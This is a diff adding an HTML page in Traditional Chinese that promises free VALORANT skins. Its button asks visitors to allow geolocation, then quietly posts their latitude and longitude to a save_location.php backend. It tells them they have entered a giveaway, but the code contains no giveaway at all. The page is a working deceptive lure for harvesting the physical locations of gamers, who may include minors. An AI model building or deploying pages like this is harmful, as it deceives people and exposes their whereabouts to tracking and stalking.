@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+  <meta charset="UTF-8">
+  <title>免費領取 VALORANT 造型</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", sans-serif;
+      background: linear-gradient(to right, #0f0f0f, #1c1c1c);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background-image: url('https://images.contentstack.io/v3/assets/bltb6530b271fddd0b1/blt5b4312b6c56efb84/64557291c08877a2bb1df30f/VAL_Episode_6_Act_3_Key_Art.jpg');
+      background-size: cover;
+      background-position: center;
+    }
+
+    .container {
+      background-color: rgba(0, 0, 0, 0.75);
+      padding: 40px;
+      border-radius: 12px;
+      text-align: center;
+      max-width: 400px;
+    }
+
+    h1 {
+      font-size: 28px;
+      margin-bottom: 10px;
+      color: #ff4655;
+    }
+
+    p {
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+
+    button {
+      background-color: #ff4655;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 18px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #e03b49;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>免費領取 VALORANT 造型！</h1>
+    <p>立即授權定位，即可參加限量造型抽獎活動！</p>
+    <button onclick="getLocation()">立即參加</button>
+  </div>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          // 傳到後端 PHP
+          fetch("save_location.php", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: `lat=${latitude}&lng=${longitude}`
+          }).then(response => {
+            alert("定位成功！已參加活動！");
+          });
+        }, function(error) {
+          alert("無法取得定位：" + error.message);
+        });
+      } else {
+        alert("你的瀏覽器不支援地理定位");
+      }
+    }
+  </script>
+</body>
+</html>
